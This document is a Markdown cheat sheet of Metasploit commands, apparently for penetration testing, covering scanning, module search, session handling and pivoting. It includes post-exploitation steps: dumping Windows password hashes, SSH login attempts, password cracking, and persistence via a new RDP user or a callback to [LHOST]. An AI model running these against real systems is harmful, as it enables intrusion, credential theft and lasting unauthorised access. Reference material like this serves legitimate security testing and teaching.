# Metasploit

`Initial Commands`

    msfdb reinit

`Check DB Status`

    db_status

`Create New Workspace`

    workspace -a <name>

`Nmap Scan Through MSF`

    db_nmap -T4 -A -vv -n <IP/CIDR> -p <PortRange> [-Pn, --script=vuln, --script=discovery]

------

## Searching Modules

    search type:(auxiliary/post/exploit) port:(#) platform:(windows/linux) [service]

------

## Modules

### Post Modules

`Hashdump` 

    msf > run post/windows/gather/hashdump

or

    msf > run post/windows/gather/smart_hashdump


`Post Modules on a Backgrounded Session`

    msf > use post/windows/gather/hashdump
    msf > show options
    msf > set SESSION 1

### Auxiliary Modules

`SSH Login`

    msf > use scanner/ssh/ssh_login
    
`Port Scanner`

    msf > use auxiliary/scanner/portscan/tcp
    msf > set RHOSTS 10.10.10.0/24

`DNS Enumeration`

    msf > use auxiliary/gather/dns_enum
    msf > set DOMAIN target.tgt

`FTP Server`

    msf > use auxiliary/server/ftp
    msf > set FTPROOT /tmp/ftproot

`Proxy Server`

    msf > use auxiliary/server/socks4

`SMB Enumeration`

    msf > auxiliary/scanner/smb/smb_version

`Password Cracking`

    msf > run auxiliary/analyze/jtr_crack_fast

------

## Sessions

`Single Session Exploitation`

Run the exploit expecting a single session that is
immediately backgrounded:

    msf > exploit -z

`Multiple Session Exploitation`

Run the exploit in the background expecting one or
more sessions that are immediately backgrounded:

    msf > exploit –j

`List all Current Jobs`

    msf > jobs –l

`Kill a Job`

    msf > jobs –k [JobID]

`List All Backgrounded Sessions`

    msf > sessions -l

`Interact With a Backgrounded Sessions`

    msf > session -i [SessionID]

`Background the Current Interactive Session`

    meterpreter > <Ctrl+Z>

**or**

    meterpreter > background

`Routing Through Sessions`

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session:  

    msf > route add [Subnet to Route To] [Subnet Netmask] [SessionID]

------

## Persistence from Meterpreter

`Windows`

    run getgui -e -u [username] -p [password]

`Linux`

    run persistence -X -i 60 -p 5000x -r [LHOST]